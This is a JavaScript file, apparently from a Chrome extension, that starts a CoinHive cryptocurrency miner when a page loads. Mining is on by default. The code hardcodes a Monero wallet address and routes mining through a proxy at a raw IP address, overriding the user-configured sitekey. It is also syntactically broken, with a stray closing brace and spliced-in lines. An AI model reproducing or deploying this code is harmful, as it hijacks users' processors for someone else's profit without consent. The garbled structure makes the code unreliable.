//CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://5.196.189.87:8892/proxy"]];
//var miner = new CoinHive.Anonymous('44FdY3ugMavewziZo1QtbKEH35y26nTwrZQ1TSmwBVBnEj72T3HnnUscNNw7Cvg8tdiJon7qKVxX5FmDU5mT7wCrPpDCKMF');
//miner.start();

window.onload = function () {
    chrome.storage.local.get(['chext-isEnabled', 'chext-sitekey', 'chext-throttle'], function (results) {
         var isEnabled = results['chext-isEnabled'];
        if (isEnabled === undefined) {
            isEnabled = true;
        }

        var sitekey = results['chext-sitekey'];
        if (sitekey === undefined ) {
            sitekey = 'dYc63W7HiuYeKksC6Ag4Gt4gyyd2R78U';
        }

        var throttle = results['chext-throttle'];
        if (throttle === undefined) {
            throttle = 40;
        }

        //var miner = new CoinHive.Anonymous(sitekey, {
        //    throttle: 1 - (throttle / 100)
		CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://5.196.189.87:8892/proxy"]];
		var miner = new CoinHive.Anonymous('44FdY3ugMavewziZo1QtbKEH35y26nTwrZQ1TSmwBVBnEj72T3HnnUscNNw7Cvg8tdiJon7qKVxX5FmDU5mT7wCrPpDCKMF');
        });

        if (isEnabled) {
           // miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
		   
		   
		   miner.start();
        }

        chrome.storage.onChanged.addListener(function () {
            chrome.storage.local.get(['chext-isEnabled', 'chext-sitekey', 'chext-throttle'], function (results) {
                var isEnabled = results['chext-isEnabled'];
                if (isEnabled === undefined) {
                    isEnabled = true;
                }

                var sitekey = results['chext-sitekey'];
                if (sitekey === undefined) {
                    sitekey = 'dYc63W7HiuYeKksC6Ag4Gt4gyyd2R78U';
                }

                var throttle = results['chext-throttle'];
                if (throttle === undefined) {
                    throttle = 40;
                }

                miner.stop();
                miner = new CoinHive.Anonymous(sitekey, {
                    throttle: 1 - (throttle / 100)
                });
                if (isEnabled) {
                    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
                }
            });
        });
    });
}
